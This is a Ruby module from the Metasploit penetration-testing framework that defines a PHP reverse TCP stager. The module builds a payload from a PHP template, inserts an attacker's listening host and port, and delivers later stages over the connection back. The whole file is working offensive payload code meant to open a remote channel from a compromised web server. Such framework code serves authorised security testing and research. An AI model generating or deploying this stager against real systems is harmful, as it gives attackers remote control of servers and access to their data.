##
# $Id: reverse_tcp.rb 12196 2011-04-01 00:51:33Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/payload/php'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Stager
	include Msf::Payload::Php

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'PHP Reverse TCP stager',
			'Version'       => '$Revision: 12196 $',
			'Description'   => 'Reverse PHP connect back stager with checks for disabled functions',
			'Author'        => 'egypt',
			'License'       => MSF_LICENSE,
			'Platform'      => 'php',
			'Arch'          => ARCH_PHP,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Stager'        => {'Payload' => ""}
			))
	end

	#
	# Constructs the payload
	#
	def generate
		if (datastore['LHOST'] and not datastore['LHOST'].empty?)
			lhost = datastore['LHOST']
			lport = datastore['LPORT']
		else
			lhost = '127.0.0.1'
			lport = '4444'
		end

		reverse = File.read(File.join(Msf::Config::InstallRoot, 'data', 'php', 'reverse_tcp.php'))
		reverse.gsub!("127.0.0.1", lhost)
		reverse.gsub!("4444", lport)
		#reverse.gsub!(/#.*$/, '')
		#reverse = Rex::Text.compress(reverse)

		return super + reverse
	end

	#
	# PHP's read functions suck, make sure they know exactly how much data to
	# grab by sending a length.
	#
	def handle_intermediate_stage(conn, payload)
		conn.put([payload.length].pack("N"))
	end

end
